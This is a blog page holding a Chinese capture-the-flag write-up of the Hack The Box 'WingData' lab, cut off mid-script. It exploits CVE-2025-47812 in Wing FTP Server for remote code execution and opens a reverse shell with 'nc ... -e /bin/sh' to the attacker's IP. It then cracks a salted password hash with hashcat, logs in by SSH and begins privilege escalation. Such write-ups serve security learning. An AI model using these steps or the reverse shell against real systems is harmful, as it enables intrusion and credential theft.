@@ -1,0 +1,326 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>HTB WingData 靶场 Writeup | Echoin 的博客</title><meta name="author" content="Echoin"><meta name="copyright" content="Echoin"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f5fd"><meta name="description" content="HTB WingData 靶场 Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB WingData 靶场 Writeup">
+<meta property="og:url" content="https://echoin.xyz/2026/08/24/htb-wingdata/index.html">
+<meta property="og:site_name" content="Echoin 的博客">
+<meta property="og:description" content="HTB WingData 靶场 Writeup">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://echoin.xyz/img/avatar.jpg">
+<meta property="article:published_time" content="2026-08-24T13:30:00.000Z">
+<meta property="article:modified_time" content="2026-08-24T11:19:56.036Z">
+<meta property="article:author" content="Echoin">
+<meta property="article:tag" content="HTB">
+<meta property="article:tag" content="WingData">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://echoin.xyz/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB WingData 靶场 Writeup",
+  "url": "https://echoin.xyz/2026/08/24/htb-wingdata/",
+  "image": "https://echoin.xyz/img/avatar.jpg",
+  "datePublished": "2026-08-24T13:30:00.000Z",
+  "dateModified": "2026-08-24T11:19:56.036Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Echoin",
+      "url": "https://github.com/Echoin-613"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://echoin.xyz/2026/08/24/htb-wingdata/index.html"><link rel="preconnect"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.0"><link rel="stylesheet" href="/pluginsSrc/@fortawesome/fontawesome-free/css/all.min.css?v=7.3.1"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        const data = { value }
+
+        if (ttl != null) {
+          data.expiry = Date.now() + ttl * 86400000
+        }
+
+        localStorage.setItem(key, JSON.stringify(data))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#f7f5fd')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: '/pluginsSrc/@egjs/infinitegrid/dist/infinitegrid.min.js?v=4.13.0',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HTB WingData 靶场 Writeup',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><script src="/js/no-count.js"></script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Echoin 的博客" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Echoin 的博客" type="application/rss+xml">
+</head><body><div class="bg-animation" id="web_bg" style="background: linear-gradient(135deg,;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">66</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/payloads/"><i class="fa-fw fas fa-database"></i><span> Payload库</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Echoin 的博客</span></a><a class="nav-page-title" href="/"><span class="site-name">HTB WingData 靶场 Writeup</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/payloads/"><i class="fa-fw fas fa-database"></i><span> Payload库</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">HTB WingData 靶场 Writeup</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-08-24T13:30:00.000Z" title="发表于 2026-08-24 21:30:00">2026-08-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-24T11:19:56.036Z" title="更新于 2026-08-24 19:19:56">2026-08-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 10.129.244.106</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb/htb-wingdata-001.png" alt="image-20260322092851142"></p>
+<p>22,80</p>
+<p>将机器主机名添加到本地主机文件中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.129.244.106 wingdata.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>10.129.244.106</p>
+<p><img src="/img/htb/htb-wingdata-002.png" alt="image-20260322092930236"></p>
+<p>点击Client Portal </p>
+<p><img src="/img/htb/htb-wingdata-003.png" alt="image-20260322095649272"></p>
+<p>发现跳转到一个子域名ftp.wingdata.htb</p>
+<p>把这个域名加到本地</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;10.129.244.106 ftp.wingdata.htb&quot; | sudo tee -a /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里复习了一下找子域名工具：Sublist3r，kali自带（这里不用）</p>
+</blockquote>
+<p>进入到一个登录页面：</p>
+<p><img src="/img/htb/htb-wingdata-004.png" alt="image-20260322100023038"></p>
+<p>找一下cve：</p>
+<h2 id="CVE-2025-47812"><a href="#CVE-2025-47812" class="headerlink" title="[CVE-2025-47812]"></a>[CVE-2025-47812]</h2><p> Wing FTP Server v7.4.3</p>
+<p>Wing FTP 服务器存在未经身份验证的远程代码执行漏洞 [CVE-2025-47812]</p>
+<p><strong>漏洞描述</strong> ： <strong>&#x2F;loginok.html</strong>端点中不正确的 NULL 字节处理 允许通过 <strong>Lua 注入</strong>进行未经身份验证的远程代码执行</p>
+<p><img src="/img/htb/htb-wingdata-005.png" alt="image-20260322101221209"></p>
+<h2 id="Lua注入"><a href="#Lua注入" class="headerlink" title="Lua注入"></a>Lua注入</h2><p>漏洞利用：</p>
+<p>在向loginok.html发起POST请求时，将一个空字节后跟Lua代码注入用户名中。<br>成功认证后(即使匿名)，会返回一个UID Cookie。<br>使用此UIDcookie对dir.html进行后续GET请求，触发注入的Lua代码执行，<br>导致RCE。</p>
+<p>exp:<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/52347">https://www.exploit-db.com/exploits/52347</a></p>
+<p>poc:<a target="_blank" rel="noopener" href="https://github.com/estebanzarate/CVE-2025-47812-Wing-FTP-Server-7.4.3-Unauthenticated-RCE-PoC">https://github.com/estebanzarate/CVE-2025-47812-Wing-FTP-Server-7.4.3-Unauthenticated-RCE-PoC</a></p>
+<p><img src="/img/htb/htb-wingdata-006.png" alt="image-20260322102414250"></p>
+<p>拿到shell</p>
+<blockquote>
+<p><code>ls -lah</code> 是 Linux 里很常用的查看目录内容命令</p>
+</blockquote>
+<p><img src="/img/htb/htb-wingdata-007.png" alt="image-20260322103123357"></p>
+<p>然后在<code>/opt/wftpserver/Data/1/users</code>下的wacky.xml获得用户加密凭据</p>
+<p><img src="/img/htb/htb-wingdata-008.png" alt="image-20260322104805779"></p>
+<p>但是这个poc只能进行命令执行，没有真正的拿到shell，不能文件读取</p>
+<p><img src="/img/htb/htb-wingdata-009.png" alt="image-20260322105127179"></p>
+<p>换一个poc:</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/4m3rr0r/CVE-2025-47812-poc">4m3rr0r&#x2F;CVE-2025-47812-poc：Wing FTP 服务器远程代码执行（RCE）漏洞（CVE-2025-47812）</a></p>
+<p><img src="/img/htb/htb-wingdata-010.png" alt="image-20260322105654724"></p>
+<p>然后反弹shell:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CVE-2025-47812.py -u http://ftp.wingdata.htb -c &quot;nc 10.10.15.166 8888 -e /bin/sh&quot; -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb/htb-wingdata-011.png" alt="image-20260322105846661"></p>
+<p>再读取<code>/opt/wftpserver/Data/1/users</code>下的wacky.xml</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/wftpserver/Data/1/users/wacky.xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;USER_ACCOUNTS Description=&quot;Wing FTP Server User Accounts&quot;&gt;</span><br><span class="line">    &lt;USER&gt;</span><br><span class="line">        &lt;UserName&gt;wacky&lt;/UserName&gt;</span><br><span class="line">        &lt;EnableAccount&gt;1&lt;/EnableAccount&gt;</span><br><span class="line">        &lt;EnablePassword&gt;1&lt;/EnablePassword&gt;</span><br><span class="line">        &lt;Password&gt;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&lt;/Password&gt;</span><br><span class="line">        &lt;ProtocolType&gt;63&lt;/ProtocolType&gt;</span><br><span class="line">        &lt;EnableExpire&gt;0&lt;/EnableExpire&gt;</span><br><span class="line">        &lt;ExpireTime&gt;2025-12-02 12:02:46&lt;/ExpireTime&gt;</span><br><span class="line">        &lt;MaxDownloadSpeedPerSession&gt;0&lt;/MaxDownloadSpeedPerSession&gt;</span><br><span class="line">        &lt;MaxUploadSpeedPerSession&gt;0&lt;/MaxUploadSpeedPerSession&gt;</span><br><span class="line">        &lt;MaxDownloadSpeedPerUser&gt;0&lt;/MaxDownloadSpeedPerUser&gt;</span><br><span class="line">        &lt;MaxUploadSpeedPerUser&gt;0&lt;/MaxUploadSpeedPerUser&gt;</span><br><span class="line">        &lt;SessionNoCommandTimeOut&gt;5&lt;/SessionNoCommandTimeOut&gt;</span><br><span class="line">        &lt;SessionNoTransferTimeOut&gt;5&lt;/SessionNoTransferTimeOut&gt;</span><br><span class="line">        &lt;MaxConnection&gt;0&lt;/MaxConnection&gt;</span><br><span class="line">        &lt;ConnectionPerIp&gt;0&lt;/ConnectionPerIp&gt;</span><br><span class="line">        &lt;PasswordLength&gt;0&lt;/PasswordLength&gt;</span><br><span class="line">        &lt;ShowHiddenFile&gt;0&lt;/ShowHiddenFile&gt;</span><br><span class="line">        &lt;CanChangePassword&gt;0&lt;/CanChangePassword&gt;</span><br><span class="line">        &lt;CanSendMessageToServer&gt;0&lt;/CanSendMessageToServer&gt;</span><br><span class="line">        &lt;EnableSSHPublicKeyAuth&gt;0&lt;/EnableSSHPublicKeyAuth&gt;</span><br><span class="line">        &lt;SSHPublicKeyPath&gt;&lt;/SSHPublicKeyPath&gt;</span><br><span class="line">        &lt;SSHAuthMethod&gt;0&lt;/SSHAuthMethod&gt;</span><br><span class="line">        &lt;EnableWeblink&gt;1&lt;/EnableWeblink&gt;</span><br><span class="line">        &lt;EnableUplink&gt;1&lt;/EnableUplink&gt;</span><br><span class="line">        &lt;EnableTwoFactor&gt;0&lt;/EnableTwoFactor&gt;</span><br><span class="line">        &lt;TwoFactorCode&gt;&lt;/TwoFactorCode&gt;</span><br><span class="line">        &lt;ExtraInfo&gt;&lt;/ExtraInfo&gt;</span><br><span class="line">        &lt;CurrentCredit&gt;0&lt;/CurrentCredit&gt;</span><br><span class="line">        &lt;RatioDownload&gt;1&lt;/RatioDownload&gt;</span><br><span class="line">        &lt;RatioUpload&gt;1&lt;/RatioUpload&gt;</span><br><span class="line">        &lt;RatioCountMethod&gt;0&lt;/RatioCountMethod&gt;</span><br><span class="line">        &lt;EnableRatio&gt;0&lt;/EnableRatio&gt;</span><br><span class="line">        &lt;MaxQuota&gt;0&lt;/MaxQuota&gt;</span><br><span class="line">        &lt;CurrentQuota&gt;0&lt;/CurrentQuota&gt;</span><br><span class="line">        &lt;EnableQuota&gt;0&lt;/EnableQuota&gt;</span><br><span class="line">        &lt;NotesName&gt;&lt;/NotesName&gt;</span><br><span class="line">        &lt;NotesAddress&gt;&lt;/NotesAddress&gt;</span><br><span class="line">        &lt;NotesZipCode&gt;&lt;/NotesZipCode&gt;</span><br><span class="line">        &lt;NotesPhone&gt;&lt;/NotesPhone&gt;</span><br><span class="line">        &lt;NotesFax&gt;&lt;/NotesFax&gt;</span><br><span class="line">        &lt;NotesEmail&gt;&lt;/NotesEmail&gt;</span><br><span class="line">        &lt;NotesMemo&gt;&lt;/NotesMemo&gt;</span><br><span class="line">        &lt;EnableUploadLimit&gt;0&lt;/EnableUploadLimit&gt;</span><br><span class="line">        &lt;CurLimitUploadSize&gt;0&lt;/CurLimitUploadSize&gt;</span><br><span class="line">        &lt;MaxLimitUploadSize&gt;0&lt;/MaxLimitUploadSize&gt;</span><br><span class="line">        &lt;EnableDownloadLimit&gt;0&lt;/EnableDownloadLimit&gt;</span><br><span class="line">        &lt;CurLimitDownloadLimit&gt;0&lt;/CurLimitDownloadLimit&gt;</span><br><span class="line">        &lt;MaxLimitDownloadLimit&gt;0&lt;/MaxLimitDownloadLimit&gt;</span><br><span class="line">        &lt;LimitResetType&gt;0&lt;/LimitResetType&gt;</span><br><span class="line">        &lt;LimitResetTime&gt;1762103089&lt;/LimitResetTime&gt;</span><br><span class="line">        &lt;TotalReceivedBytes&gt;0&lt;/TotalReceivedBytes&gt;</span><br><span class="line">        &lt;TotalSentBytes&gt;0&lt;/TotalSentBytes&gt;</span><br><span class="line">        &lt;LoginCount&gt;2&lt;/LoginCount&gt;</span><br><span class="line">        &lt;FileDownload&gt;0&lt;/FileDownload&gt;</span><br><span class="line">        &lt;FileUpload&gt;0&lt;/FileUpload&gt;</span><br><span class="line">        &lt;FailedDownload&gt;0&lt;/FailedDownload&gt;</span><br><span class="line">        &lt;FailedUpload&gt;0&lt;/FailedUpload&gt;</span><br><span class="line">        &lt;LastLoginIp&gt;127.0.0.1&lt;/LastLoginIp&gt;</span><br><span class="line">        &lt;LastLoginTime&gt;2025-11-02 12:28:52&lt;/LastLoginTime&gt;</span><br><span class="line">        &lt;EnableSchedule&gt;0&lt;/EnableSchedule&gt;</span><br><span class="line">    &lt;/USER&gt;</span><br><span class="line">&lt;/USER_ACCOUNTS&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到用户名和密码的hash：</p>
+<p>wacky</p>
+<p>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</p>
+<h2 id="爆破hash"><a href="#爆破hash" class="headerlink" title="爆破hash"></a><strong>爆破hash</strong></h2><p><img src="/img/htb/htb-wingdata-012.png" alt="image-20260322110928067"></p>
+<p>搜索salt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r -i &quot;salt&quot; /opt/wftpserver/Data</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb/htb-wingdata-013.png" alt="image-20260322111026786"></p>
+<p>找到salt为<code>WingFTP</code></p>
+<blockquote>
+<p>注意参数：</p>
+<ul>
+<li><code>1400</code> &#x3D; SHA2-256</li>
+<li><code>1410</code> &#x3D; 带 salt 的 SHA256 格式</li>
+</ul>
+</blockquote>
+<p>hash.txt:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP</span><br></pre></td></tr></table></figure>
+
+<p>爆破密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/htb/htb-wingdata-014.png" alt="image-20260322141401426"></p>
+<p>密码：  !#7Blushing^*Bride5</p>
+<h2 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a><strong>ssh连接</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh wacky@10.129.244.106</span><br></pre></td></tr></table></figure>
+
+<p>连接成功，拿到flag 1 ：7216f65d9d41664d8725e6546ef01887</p>
+<p><img src="/img/htb/htb-wingdata-015.png" alt="image-20260322141738204"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/img/htb/htb-wingdata-016.png" alt="image-20260322141829396"></p>
+<p>有一个python脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">wacky@wingdata:~$ cat /opt/backup_clients/restore_backup_clients.py</span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> tarfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">BACKUP_BASE_DIR = <span class="string">&quot;/opt/backup_clients/backups&quot;</span></span><br><span class="line">STAGING_BASE = <span class="string">&quot;/opt/backup_clients/restored_backups&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_backup_name</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.fullmatch(<span class="string">r&quot;^backup_\d+\.tar$&quot;</span>, filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    client_id = filename.split(<span class="string">&#x27;_&#x27;</span>)[<span class="number">1</span>].rstrip(<span class="string">&#x27;.tar&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> client_id.isdigit() <span class="keyword">and</span> client_id != <span class="string">&quot;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_restore_tag</span>(<span class="params">tag</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bool</span>(re.fullmatch(<span class="string">r&quot;^[a-zA-Z0-9_]&#123;1,24&#125;$&quot;</span>, tag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">&quot;Restore client configuration from a validated backup tarball.&quot;</span>,</span><br><span class="line">        epilog=<span class="string">&quot;Example: sudo %(prog)s -b backup_1001.tar -r restore_john&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-b&quot;</span>, <span class="string">&quot;--backup&quot;</span>,</span><br><span class="line">        required=<span class="literal">True</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Backup filename (must be in /home/wacky/backup_clients/ and match backup_&lt;client_id&gt;.tar, &quot;</span></span><br><span class="line">             <span class="string">&quot;where &lt;client_id&gt; is a positive integer, e.g., backup_1001.tar)&quot;</span></span><br><span class="line">    )</span><br><span class="line">    parser.add_argument(</span><br><span class="line">        <span class="string">&quot;-r&quot;</span>, <span class="string">&quot;--restore-dir&quot;</span>,</span><br><span class="line">        required=<span class="literal">True</span>,</span><br><span class="line">        <span class="built_in">help</span>=<span class="string">&quot;Staging directory name for the restore operation. &quot;</span></span><br><span class="line">             <span class="string">&quot;Must follow the format: restore_&lt;client_user&gt; (e.g., restore_john). &quot;</span></span><br><span class="line">             <span class="string">&quot;Only alphanumeric characters and underscores are allowed in the &lt;client_user&gt; part (1–24 characters).&quot;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> validate_backup_name(args.backup):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Invalid backup name. Expected format: backup_&lt;client_id&gt;.tar (e.g., backup_1001.tar)&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(backup_path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Backup file not found: 